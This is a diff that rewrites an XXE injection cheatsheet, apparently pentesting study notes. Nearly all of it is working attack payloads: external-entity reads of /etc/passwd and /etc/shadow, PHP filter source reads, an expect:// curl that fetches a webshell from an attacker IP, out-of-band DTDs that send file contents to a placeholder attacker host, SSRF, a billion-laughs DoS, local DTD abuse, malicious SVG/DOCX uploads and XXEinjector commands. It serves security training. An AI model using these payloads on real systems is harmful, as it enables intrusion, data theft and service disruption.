@@ -1,624 +1,312 @@
 # XXE Injection Cheatsheet
 
----
+Quick-reference companion to the full study notes. Replace `YOUR_IP` / placeholders as needed.
 
 ## Table of Contents
 
-- [1. Concepts](#1-concepts)
-  - [1.1 XML Basics](#11-xml-basics)
-  - [1.2 XML DTD](#12-xml-dtd)
-  - [1.3 XML Entities](#13-xml-entities)
-  - [1.4 Custom Entities](#14-custom-entities)
-  - [1.5 External Entities](#15-external-entities)
-- [2. Discovery & Identification](#2-discovery--identification)
-  - [2.1 Finding XXE Entry Points](#21-finding-xxe-entry-points)
-  - [2.2 Testing for Vulnerability](#22-testing-for-vulnerability)
-  - [2.3 XML Special Character Entities](#23-xml-special-character-entities)
-- [3. Local File Disclosure](#3-local-file-disclosure)
-  - [3.1 Reading Sensitive Files](#31-reading-sensitive-files)
-  - [3.2 Reading Source Code (PHP base64 wrapper)](#32-reading-source-code-php-base64-wrapper)
-  - [3.3 Remote Code Execution (RCE)](#33-remote-code-execution-rce)
-  - [3.4 SSRF via XXE](#34-ssrf-via-xxe)
-  - [3.5 DoS (Billion Laughs / XML Bomb)](#35-dos-billion-laughs--xml-bomb)
-- [4. Advanced File Disclosure](#4-advanced-file-disclosure)
-  - [4.1 CDATA Exfiltration (External DTD Method)](#41-cdata-exfiltration-external-dtd-method)
-  - [4.2 CDATA Limitations](#42-cdata-limitations)
-  - [4.3 Error-Based XXE](#43-error-based-xxe)
-  - [4.4 Other Error-Triggering Methods](#44-other-error-triggering-methods)
-- [5. Blind XXE / OOB Exfiltration](#5-blind-xxe--oob-exfiltration)
-  - [5.1 Detecting Blind XXE (OOB Ping)](#51-detecting-blind-xxe-oob-ping)
-  - [5.2 OOB via XML Parameter Entities](#52-oob-via-xml-parameter-entities)
-  - [5.3 OOB Data Exfiltration](#53-oob-data-exfiltration)
-  - [5.4 Automated OOB Exfiltration](#54-automated-oob-exfiltration)
-  - [5.5 Repurposing a Local DTD (Blind)](#55-repurposing-a-local-dtd-blind)
-- [6. Hidden Attack Surface](#6-hidden-attack-surface)
-  - [6.1 XInclude Attacks](#61-xinclude-attacks)
-  - [6.2 XXE via File Upload](#62-xxe-via-file-upload)
-  - [6.3 XXE via Modified Content-Type](#63-xxe-via-modified-content-type)
-- [7. Quick Reference — Payloads](#7-quick-reference--payloads)
+1. [Core Concepts](#1-core-concepts)
+2. [Local File Disclosure](#2-local-file-disclosure)
+   - Basic file read
+   - Reading source code (PHP `php://filter`)
+   - RCE attempts
+   - SSRF via XXE
+   - DOS ("billion laughs")
+3. [Advanced File Disclosure](#3-advanced-file-disclosure)
+   - CDATA wrapping
+   - Error-based XXE
+   - Other error-triggering tricks
+4. [Blind XXE / OOB Exfiltration](#4-blind-xxe--oob-exfiltration)
+   - Detect (OOB ping)
+   - Method 1 — Generic HTTP exfil
+   - Method 2 — PHP backend base64
+   - Decision guide
+   - DNS exfiltration
+   - Forging a WAV header (upload filter bypass)
+   - Automated tooling — XXEinjector
+   - Repurposing a local DTD
+5. [Hidden Attack Surface](#5-hidden-attack-surface)
+   - XInclude
+   - File upload vectors (SVG, DOCX/XLSX/PPTX)
+   - Content-Type switching
+6. [Quick Triage Flow](#6-quick-triage-flow)
 
 ---
 
-## 1. Concepts
+## 1. Core Concepts
 
-### 1.1 XML Basics
+| Term | Meaning |
+|---|---|
+| DTD | Validates XML structure; can be internal, external file (`SYSTEM`), or external URL |
+| Entity | XML "variable", `&name;` |
+| External entity | Entity value loaded from outside the DTD via `SYSTEM` (file path / URL) or `PUBLIC` |
+| Parameter entity | `%name;` — only usable inside a DTD, declared with `<!ENTITY % name "value">` |
 
-XML (Extensible Markup Language) stores/structures data using a tree of tagged elements. Key components:
+**Predefined XML entities:** `&lt;` `&gt;` `&amp;` `&apos;` `&quot;`
 
-| Term | Description | Example |
-|------|-------------|---------|
-| **Tag** | Key wrapped in `< />` | `<date>` |
-| **Entity** | XML variable wrapped in `& ;` | `&lt;` |
-| **Element** | Tag + its value | `<date>01-01-2022</date>` |
-| **Attribute** | Optional spec inside a tag | `version="1.0"` |
-| **Declaration** | First line, defines version/encoding | `<?xml version="1.0" encoding="UTF-8"?>` |
-
----
-
-### 1.2 XML DTD
-
-Document Type Definition — defines the structure of an XML document.
-
-**Internal DTD:**
+**Basic internal entity test:**
 ```xml
-<!DOCTYPE email [
-  <!ELEMENT email (date, time, sender, recipients, body)>
-  <!ELEMENT date (#PCDATA)>
-]>
-```
-
-**External DTD file:**
-```xml
-<!DOCTYPE email SYSTEM "email.dtd">
-```
-
-**External DTD via URL:**
-```xml
-<!DOCTYPE email SYSTEM "http://example.com/email.dtd">
-```
-
----
-
-### 1.3 XML Entities
-
-Built-in character entities to escape XML-reserved characters:
-
-| Character | Entity |
-|-----------|--------|
-| `<` | `&lt;` |
-| `>` | `&gt;` |
-| `&` | `&amp;` |
-| `'` | `&apos;` |
-| `"` | `&quot;` |
-
----
-
-### 1.4 Custom Entities
-
-Defined with `ENTITY` keyword inside a DTD:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company "Inlane Freight">
 ]>
-...
-<name>&company;</name>  <!-- renders as "Inlane Freight" -->
 ```
+If `&company;` gets replaced in the response → app parses your DTD → potential XXE.
+
+**Tip:** If app sends JSON, try changing `Content-Type` to `application/xml` / `text/xml` and converting body to XML — see §7.
 
 ---
 
-### 1.5 External Entities
+## 2. Local File Disclosure
 
-Entities whose value is loaded from a file or URL using the `SYSTEM` keyword:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "http://localhost/company.txt">
-  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
-]>
-```
-
-> `PUBLIC` can be used instead of `SYSTEM` for publicly declared entities/standards.
-
-**Why this matters for attacks:** When the XML is parsed server-side (SOAP APIs, web forms), the entity can reference local files and expose them in the response.
-
----
-
-## 2. Discovery & Identification
-
-### 2.1 Finding XXE Entry Points
-
-Look for endpoints that accept XML input:
-- Web forms transmitting data in XML format
-- SOAP/XML APIs
-- File upload functionality (SVG, DOCX, XLSX, PDF, etc.)
-- Endpoints with `Content-Type: application/xml` or `text/xml`
-
-> **Tip:** Even if an app uses JSON, try switching `Content-Type: application/xml` and converting the body to XML. Some apps silently accept both.
-
----
-
-### 2.2 Testing for Vulnerability
-
-**Step 1** — Define a harmless custom entity and reference it in a reflected field:
-
+### Basic file read
 ```xml
 <!DOCTYPE email [
-  <!ENTITY test "HelloXXE">
+  <!ENTITY company SYSTEM "file:///etc/passwd">
 ]>
 ...
-<email>&test;</email>
+<email>&company;</email>
 ```
 
-If the response shows `HelloXXE` instead of `&test;` literally → **parser is resolving entities → vulnerable**.
-
-**Step 2** — Escalate to an external entity (file read):
-
+### Reading source code (binary/special-char files) — PHP only
 ```xml
-<!DOCTYPE email [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-...
-<email>&xxe;</email>
+<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ```
+Decode the base64 result locally.
 
----
-
-### 2.3 XML Special Character Entities
-
-Always try predefined entities first when injecting into XML fields:
-
-| Character | Entity |
-|-----------|--------|
-| `<` | `&lt;` |
-| `>` | `&gt;` |
-| `&` | `&amp;` |
-| `'` | `&apos;` |
-| `"` | `&quot;` |
-
----
-
-## 3. Local File Disclosure
-
-### 3.1 Reading Sensitive Files
-
+### RCE attempts
+- `expect://id` (requires PHP `expect` module, rarely enabled)
+- Better: download a webshell via `curl`, replacing spaces with `$IFS` (avoid `|`, `>`, `{`):
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>
-  <email>&xxe;</email>
-</root>
+<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ```
 
-**Common targets:**
-
-| OS | Path |
-|----|------|
-| Linux | `file:///etc/passwd` |
-| Linux | `file:///etc/shadow` |
-| Linux | `file:///home/user/.ssh/id_rsa` |
-| Windows | `file:///c:/windows/win.ini` |
-| Windows | `file:///c:/boot.ini` |
-
-> **Note:** On Java web apps, specifying a directory path instead of a file may return a directory listing.
-
----
-
-### 3.2 Reading Source Code (PHP base64 wrapper)
-
-Direct file reads break on files containing XML special characters (`<`, `>`, `&`). Use PHP's filter wrapper to base64-encode first:
-
+### SSRF via XXE
 ```xml
-<!DOCTYPE email [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-]>
-...
-<email>&xxe;</email>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
+Two-way if reflected in response; otherwise blind SSRF (still impactful).
 
-Decode the base64 output to read the source code.
-
-> ⚠️ **PHP only.** Does not work on Java, .NET, or other backends.
-
----
-
-### 3.3 Remote Code Execution (RCE)
-
-Requires the PHP `expect` module (rarely enabled by default).
-
-**1. Host a web shell:**
-```bash
-echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
-sudo python3 -m http.server 80
-```
-
-**2. Use `expect://` with `$IFS` to avoid spaces breaking XML:**
+### DOS ("billion laughs" — mostly patched on modern servers)
 ```xml
-<?xml version="1.0"?>
-<!DOCTYPE email [
-  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">
-]>
-<root>
-  <email>&xxe;</email>
-</root>
-```
-
-> ⚠️ Avoid `|`, `>`, `{` — they break XML syntax. Use `$IFS` in place of spaces.
-> ⚠️ `expect` is not enabled on modern PHP servers — this rarely works.
-
----
-
-### 3.4 SSRF via XXE
-
-Force the server to make an internal HTTP request:
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal.target.com/">
-]>
-<root>
-  <data>&xxe;</data>
-</root>
-```
-
-**Two-way SSRF** (if output is reflected): iterate URL paths to enumerate the internal API.
-
-**Blind SSRF** (if output is not reflected): monitor an out-of-band server for callbacks.
-
----
-
-### 3.5 DoS (Billion Laughs / XML Bomb)
-
-Exponential entity expansion exhausts server memory:
-
-```xml
-<?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY a0 "DOS">
   <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
-  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
-  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
-  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
-  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
-  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
-  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
-  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
-  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
+  <!-- ... chain up to a10 ... -->
 ]>
-<root><email>&a10;</email></root>
+<email>&a10;</email>
 ```
-
-> ⚠️ Modern web servers (e.g. Apache) protect against self-reference loops — this is largely patched.
 
 ---
 
-## 4. Advanced File Disclosure
+## 3. Advanced File Disclosure
 
-### 4.1 CDATA Exfiltration (External DTD Method)
+### CDATA wrapping (read files with `<`, `>`, `&`)
+Naive inline composition **fails** in internal DTD (can't compose entity from other entities, can't use `%param;` inside internal subset). Fix: push composition into an **external DTD**.
 
-CDATA wraps file content as raw character data, bypassing XML special character parsing issues.
-
-**Why the naive inline approach fails:**
-- XML internal DTD subset does not allow entity values composed from other entity references.
-- Parameter entities (`%name;`) cannot be used inside entity value declarations in the internal DTD.
-
-**Working approach — use an external DTD for composition:**
-
-**Step 1 — Create and host `xxe.dtd`:**
-```bash
-echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
-python3 -m http.server 8000
+`xxe.dtd` (hosted by you):
+```dtd
+<!ENTITY joined "%begin;%file;%end;">
 ```
 
-**Step 2 — Send the payload:**
+Payload:
 ```xml
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA[">
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
   <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
+  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
   %xxe;
 ]>
 ...
 <email>&joined;</email>
 ```
+Limitations: fails on files containing `%`, the sequence `]]>`, or true binary data (use `php://filter` base64 instead).
 
-**How it works:**
-1. `%begin`, `%file`, `%end` are declared as parameter entities.
-2. `%xxe` loads your external DTD, where composition is permitted.
-3. `xxe.dtd` defines `&joined;` by concatenating all three — wrapping file content in CDATA.
-4. `&joined;` in the document body outputs the file safely.
+### Error-based XXE
+Use when output isn't reflected but errors are (PHP errors, Java exceptions). First confirm by sending malformed XML (broken tags, undefined entities) and checking for stack traces / path leaks.
 
-To read a different file, only change `%file`:
-```xml
-<!ENTITY % file SYSTEM "file:///var/www/html/config.php">
-```
-
----
-
-### 4.2 CDATA Limitations
-
-| Scenario | Works? |
-|----------|--------|
-| PHP/HTML source files | ✅ Yes |
-| Config files with `=`, `:`, spaces | ✅ Yes |
-| Files containing `&` or `<` | ✅ Yes (CDATA handles these) |
-| Files containing `%` | ❌ No — DTD parse error |
-| Files containing `]]>` | ❌ No — terminates CDATA early |
-| Binary / non-Unicode files | ❌ No — use `php://filter` base64 instead |
-
----
-
-### 4.3 Error-Based XXE
-
-When the app doesn't reflect XML output but does show runtime errors (PHP errors, Java stack traces), errors can be weaponized to leak file contents.
-
-**Step 1 — Confirm error disclosure:**
-Send malformed XML to trigger a parser error:
-- Delete a closing tag
-- Use `<roo>` instead of `<root>`
-- Reference a non-existing entity: `&nonexistent;`
-
-If you see a stack trace or file path leak → error-based XXE is possible.
-
-**Step 2 — Host the malicious DTD:**
-```
+Hosted DTD:
+```dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
 ```
 
-> `&#x25;` = `%` (hex entity encoding required for nested `%` inside a DTD declaration)
-
-**Step 3 — Trigger it from the request:**
+Payload (no XML body needed):
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
-  %xxe;
-]>
-<root><email>test</email></root>
-```
-
-The parser will error out trying to load `file:///nonexistent/<contents of /etc/passwd>` and display the file content inside the error message.
-
----
-
-### 4.4 Other Error-Triggering Methods
-
-- Delete closing tag from document
-- Malform element names (`<roo>` vs `<root>`)
-- Reference undefined entity (`&undefined;`)
-- Break XML structure intentionally
-
-Any error message containing a file path or server info is also useful for recon.
-
----
-
-## 5. Blind XXE / OOB Exfiltration
-
-### 5.1 Detecting Blind XXE (OOB Ping)
-
-No output reflected — verify via out-of-band callback using Burp Collaborator or a self-hosted listener:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR_URL">
+  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
 ]>
-<root><email>&xxe;</email></root>
 ```
+The "nonexistent path" error message leaks the file content. `&#x25;` = required encoding for nested `%`.
 
-If you see a DNS/HTTP hit on your listener → blind XXE confirmed.
+### Other error-triggering tricks
+If the above gives no output, try malformed/bad URI schemes, or reference files whose names contain characters that break URI parsing — same principle: force the parser to build a path containing the file content, then fail on it.
 
 ---
 
-### 5.2 OOB via XML Parameter Entities
+## 4. Blind XXE / OOB Exfiltration
 
-In cases where regular entities are blocked, parameter entities (prefixed with `%`) can still trigger OOB:
+Use when there's **no reflected output and no errors**.
 
+### Detect (OOB ping)
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR_URL">
-  %xxe;
-]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> ]>
+&xxe;
+```
+Or with parameter entities (works when regular entities are filtered):
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
 ```
 
----
-
-### 5.3 OOB Data Exfiltration
-
-Exfiltrate file content via DNS/HTTP using a two-stage DTD:
-
-**Host `exfil.dtd` on your server:**
-```
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?x=%file;'>">
+### Method 1 — Generic HTTP exfil (any backend)
+`malicious.dtd`:
+```dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP/?x=%file;'>">
 %eval;
-%exfil;
+%exfiltrate;
 ```
-
-**Request payload:**
+Payload:
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/exfil.dtd">
+  <!ENTITY % xxe SYSTEM "http://YOUR_IP/malicious.dtd">
   %xxe;
 ]>
-<root><data>test</data></root>
 ```
+**Newline problem:** Java 1.7+ validates URL chars, multiline files (e.g. `/etc/passwd`) can silently fail.
+- Workaround A: switch `%exfiltrate` scheme to `ftp://` (no URI validation) + run a mock FTP listener (file sent as `CWD` commands, line by line).
+- Workaround B: target single-line files first (`/etc/hostname`) to confirm.
 
-The file contents will be URL-encoded and sent to your server as a query parameter.
-
-> ⚠️ Multi-line files may fail — works best for single-line values (hostnames, tokens, passwords).
-
----
-
-### 5.4 Automated OOB Exfiltration
-
-Tools:
-- **XXEinjector** — automated exploitation via direct and OOB methods
-- **Burp Collaborator** — built-in OOB detection in Burp Suite Pro
-- **xxe.sh** — OOB server for FTP/HTTP exfiltration and payload generation
-
----
-
-### 5.5 Repurposing a Local DTD (Blind)
-
-When external DTD loading is blocked (no outbound HTTP), use a DTD already present on the server to redefine an existing parameter entity.
-
-**Find local DTDs:**
-```bash
-locate .dtd
+### Method 2 — PHP backend, base64 (handles multiline, preferred for PHP)
+`xxe.dtd`:
+```dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
 ```
-
-**Common Linux paths:**
-```
-/usr/share/xml/fontconfig/fonts.dtd
-/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
-/usr/share/xml/svg/svg10.dtd
-/usr/share/xml/svg/svg11.dtd
-/usr/share/yelp/dtd/docbookx.dtd
-```
-
-**Example — exploiting `/usr/share/xml/fontconfig/fonts.dtd`** (which has an injectable `%constant` entity):
+Payload:
 ```xml
-<!DOCTYPE message [
-  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
-  <!ENTITY % constant 'aaa)>
+<!DOCTYPE email [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+Catch + auto-decode:
+```php
+<?php
+if (isset($_GET['content'])) { error_log("\n\n" . base64_decode($_GET['content'])); }
+```
+`php -S 0.0.0.0:8000`
+
+### Decision guide
+```
+PHP target?  → Method 2 (php://filter base64), most reliable
+Not PHP?     → Method 1 (generic HTTP DTD)
+  Newlines breaking it? → FTP exfil, or single-line files first
+```
+
+### DNS exfiltration (when HTTP is filtered)
+Encode short data as a subdomain → capture with `tcpdump` / DNS logger. Best for short tokens, not full files.
+
+### Bypassing magic-byte/upload filters: forge a WAV header
+Build a minimal valid RIFF/WAV file with the XXE payload embedded in an `iXML` chunk (Python `struct`), so the file passes magic-byte checks but still gets parsed as XML by metadata tools.
+
+### Automated tooling — XXEinjector
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+Capture a request, keep only first line + `XXEINJECT` marker, then:
+```bash
+ruby XXEinjector.rb --host=YOUR_IP --httpport=8000 --file=/tmp/xxe.req \
+  --path=/etc/passwd --oob=http --phpfilter
+```
+Results land in `Logs/<target-ip>/<path>.log`.
+
+### Repurposing a local DTD (when OOB is fully blocked)
+If external DTDs can't be loaded/exfiltrated at all, abuse a **DTD file that already exists on the server filesystem** by redefining one of its entities to smuggle in the error-based payload (hybrid internal+external DTD relaxes the parameter-entity nesting restriction).
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+  <!ENTITY % custom_entity '
     <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
     &#x25;eval;
     &#x25;error;
-    <!ELEMENT aa (bb'>
+  '>
   %local_dtd;
 ]>
-<message>Text</message>
 ```
+1. Probe for a known DTD on disk (errors reveal present/missing) — common Linux/GNOME target: `/usr/share/yelp/dtd/docbookx.dtd`.
+2. Fetch the real DTD (often open source) to find an entity name you can redefine.
+3. Send the hybrid payload above to trigger the leak.
 
 ---
 
-## 6. Hidden Attack Surface
+## 5. Hidden Attack Surface
 
-### 6.1 XInclude Attacks
-
-When you can't control the DOCTYPE (e.g. your input is embedded into a server-side XML document), use XInclude — it works without a DOCTYPE:
-
+### XInclude (no DOCTYPE control needed)
+Use when you only control a single field that gets embedded into a server-side XML doc (e.g. SOAP backend).
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 ```
+- `parse="text"` is required for non-XML files.
+- Bypasses DOCTYPE-based filters entirely.
+- SSRF variant: `href="http://internal.company.com/admin"`.
 
-Inject this directly into any XML field value that is reflected in a server-side XML document.
-
----
-
-### 6.2 XXE via File Upload
-
-File formats that contain XML can be weaponized:
-
-| Format | Notes |
-|--------|-------|
-| SVG | XML-based image format — widely accepted |
-| DOCX / XLSX / PPTX | ZIP archives containing XML — inject into internal XML files |
-| ODT / ODS / ODP | Same ZIP/XML structure as Office formats |
-| PDF | Can contain XML metadata |
-
-**SVG example:**
+### File upload vectors
+**SVG** (entirely XML):
 ```xml
 <?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 ```
+File content renders as visible text in the image. Use short single-line files first.
 
-Upload as an SVG image and check if the contents appear in the response or in how the image is rendered.
-
-Tools:
-- **oxml_xxe** — embeds XXE into DOCX/XLSX/PPTX/ODT/SVG/PDF
-- **docem** — embeds XXE/XSS into docx, odt, pptx, etc.
-
----
-
-### 6.3 XXE via Modified Content-Type
-
-When an app normally uses JSON, try switching to XML:
-
-**Original request:**
+**DOCX/XLSX/PPTX** (ZIP containing XML internally):
+```bash
+unzip document.docx -d unzipped/
+vim unzipped/word/document.xml   # inject DOCTYPE + entity, reference &xxe;
+cd unzipped && zip -r ../malicious.docx .
 ```
-Content-Type: application/json
-{"email":"test@test.com"}
-```
+Upload the doc; if reflected check output, else use OOB.
 
-**Modified request:**
-```
-Content-Type: application/xml
-<?xml version="1.0"?>
+### Content-Type switching
+Many backends are lenient — submit XML even where forms/APIs expect urlencoded or JSON.
+```http
+POST /action HTTP/1.1
+Content-Type: text/xml
+Content-Length: 113
+
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root><email>&xxe;</email></root>
+<foo>&xxe;</foo>
 ```
-
-If the app processes XML silently, it may expose an XXE vulnerability not visible through normal testing.
+Test both `application/x-www-form-urlencoded → text/xml` and `application/json → text/xml`.
 
 ---
 
-## 7. Quick Reference — Payloads
+## 6. Quick Triage Flow
 
-```xml
-<!-- Basic file read -->
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root><data>&xxe;</data></root>
-
-<!-- PHP base64 source read -->
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
-<root><data>&xxe;</data></root>
-
-<!-- SSRF -->
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.target/secret">]>
-<root><data>&xxe;</data></root>
-
-<!-- Blind OOB ping -->
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP/">]>
-<root><data>&xxe;</data></root>
-
-<!-- Blind OOB via parameter entity -->
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/">%xxe;]>
-
-<!-- XInclude (no DOCTYPE needed) -->
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-
-<!-- SVG file upload -->
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
-
-<!-- Error-based (host DTD externally) -->
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/error.dtd">%xxe;]>
-
-<!-- CDATA exfiltration (host xxe.dtd externally) -->
-<!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd">
-  %xxe;
-]>
-<root><email>&joined;</email></root>
 ```
-
----
-
-*Happy hacking — authorized targets only.*
+1. Find XML input (form, API, file upload, SOAP)
+2. Inject internal entity, check reflection → confirms basic XXE
+3. Reflected output present?
+   ├─ Yes → file:// read, php://filter base64 for binary, CDATA trick for special chars
+   └─ No  → Errors shown?
+            ├─ Yes → Error-based XXE (nonexistent-file trick)
+            └─ No  → Blind / OOB (Collaborator ping → HTTP/FTP/DNS exfil → automate w/ XXEinjector)
+4. No DOCTYPE control? → Try XInclude
+5. Standard XML endpoint not found? → Try file upload (SVG/DOCX) or Content-Type switch
+6. OOB fully blocked? → Repurpose a local DTD for error-based leak
+```
